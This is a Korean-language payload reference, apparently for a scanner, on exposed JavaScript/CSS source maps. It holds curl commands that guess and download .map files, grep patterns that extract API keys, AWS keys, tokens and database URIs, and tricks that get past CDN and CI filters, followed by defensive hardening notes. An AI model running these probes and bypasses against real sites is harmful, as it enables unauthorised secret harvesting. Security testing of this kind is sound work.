### 정찰 페이로드

#### JS/CSS 파일 enumeration
```bash
# HTML에서 JS/CSS URL 추출
curl -s "https://target/" | grep -oP '(src|href)="[^"]*\.(js|css|mjs)"' | grep -oP '"[^"]*"' | tr -d '"'

# robots.txt, sitemap.xml에서 추가 파일
curl -s "https://target/robots.txt"
curl -s "https://target/sitemap.xml"
```

#### sourceMappingURL 확인
```bash
# 각 번들 마지막 주석
curl -s "https://target/static/js/main.abc123.js" | tail -3
# //# sourceMappingURL=main.abc123.js.map

# inline sourcemap (data:application/json;base64,...)
curl -s "https://target/static/js/main.js" | grep "sourceMappingURL=data:"
```

---

### 기본 페이로드

#### .map 파일 다운로드 시도
```bash
# 명시된 URL
curl -o /tmp/map.json "https://target/static/js/main.abc123.js.map" -v

# sourceMappingURL 없어도 추측 (HIDDEN_BUT_EXPOSED 라벨)
for name in main bundle app vendor chunk index runtime polyfills; do
  for ext in js mjs; do
    curl -sI "https://target/static/${ext}/${name}.${ext}.map" | head -1
  done
done

# 압축본 잔존
curl -sI "https://target/static/js/main.js.map.gz"
curl -sI "https://target/static/js/main.js.map.br"

# CSS sourcemap
curl -sI "https://target/static/css/main.css.map"

# Service Worker
curl -sI "https://target/sw.js.map"
curl -sI "https://target/service-worker.js.map"

# Next.js 서버 sourcemap
curl -sI "https://target/_next/static/chunks/main.abc.js.map"
curl -sI "https://target/_next/server/pages/index.js.map"

# Hash variants
for hash in $(seq 1 5); do
  curl -sI "https://target/static/js/main-$(printf '%08x' $hash).js.map"
done
```

#### 민감 정보 추출
```bash
# sourcesContent 필드 파싱 + 패턴 검색
jq -r '.sourcesContent[]?' /tmp/map.json | grep -iE "apikey|api_key|secret|token|password|AKIA|aws_|mongodb://|postgres://|redis://|bearer "

# 내부 URL/주석
jq -r '.sourcesContent[]?' /tmp/map.json | grep -iE "internal|admin|staging|dev\.|localhost|127\.0\.0\.1|10\.|192\.168\.|TODO|FIXME|XXX"

# 환경변수 인라인 치환
jq -r '.sourcesContent[]?' /tmp/map.json | grep -oE 'process\.env\.[A-Z_]+ = "[^"]+"'

# 모듈 트리 (sources)
jq -r '.sources[]?' /tmp/map.json
```

#### Sentry/Datadog upload 확인
```bash
# 일반적인 Sentry artifact 경로
curl -sI "https://target/_sentry/artifacts/<sha256>"

# 공개된 Sentry release
curl -s "https://sentry.io/api/0/organizations/<org>/releases/<release>/files/"
```

---

### 우회 페이로드

| 방어 | 페이로드 |
|---|---|
| CI에서 `*.map` 삭제 | `*.map.gz`/`*.map.br` 압축본 잔존, `.css.map` 누락, `sw.js.map`/`service-worker.js.map` 누락 |
| CDN path filter (`.map` 차단) | path traversal `/js/../..//bundle.js.map`, query `?` 추가 (`bundle.js.map?x=1`), `.MAP` 대소문자 |
| `hidden-source-map` | 파일 자체는 잔존 — 추측 가능 이름 (`main.js.map`, `app.js.map`) |
| Sentry upload 후 삭제 | Sentry public release artifact 권한 부족 시 조회 가능 |
| 인증된 sourcemap server | 토큰이 클라이언트 번들에 하드코딩 — 추출 후 재사용 |
| Public S3 bucket 배포 | `.map` 파일 public read — bucket enumeration |
| HTTP 404 로깅 의존 | 정상 응답 코드로 위장 (CDN 설정 의존) |
| 내부 IP 화이트리스트 | sourcemap server가 외부 노출되면 우회 |

#### 다양한 path 변형
```bash
# 직접 .map 차단 시도
GET /static/js/main.js.map      → 403
GET /static/js/main.js.map?x=1  → 200 (query 무시)
GET /static/js/main.js.MAP      → 200 (case 차이)
GET /static/js/../js/main.js.map → 200 (path 정규화 차이)
```

---

### 참고사항

- Source Map 자체는 직접 공격 벡터가 아니나 민감 정보 포함 시 심각도 격상
- `hidden-source-map`은 주석만 제거 — 파일은 여전히 배포되므로 추측 가능 이름이면 무용지물
- Next.js는 `productionBrowserSourceMaps: false`여도 서버 sourcemap 별도 — `/_next/server/` 경로 점검
- Sentry/Datadog upload는 배포 후 clean step 필수 — CI에 `find . -name "*.map" -delete`
- CDN edge에서 `.map` 확장자 필터링은 가장 간단한 방어
- CI artifact가 public repo면 GitHub Actions artifact URL도 노출 위로 고려
- 민감 정보 없는 sourcemap은 영향도 약함 — 스캐너 목적은 노출 + 민감 정보 병합 판정
- 자체 코드 외 vendor sourcemap (node_modules)도 있으면 본인 코드 식별 어려움 (효율 방어)
- inline sourcemap (`data:application/json;base64,...`)은 번들 자체에 포함 — 전체 노출
- `sourcesContent`가 `null`이면 원본 소스 미포함 — 영향도 약함 (단순 line number 매핑만)
- `sourceRoot`로 외부 경로 추측 가능 — repo 구조 노출
- 모듈 트리 (`sources` 배열)에 사내 모듈 경로가 그대로 노출되면 internal info disclosure
- WebPack 5+는 `output.devtoolModuleFilenameTemplate`으로 모듈 경로 위장 가능 (방어)
- Vite는 `build.sourcemap: 'hidden'`이 default가 아닌 경우 잔존
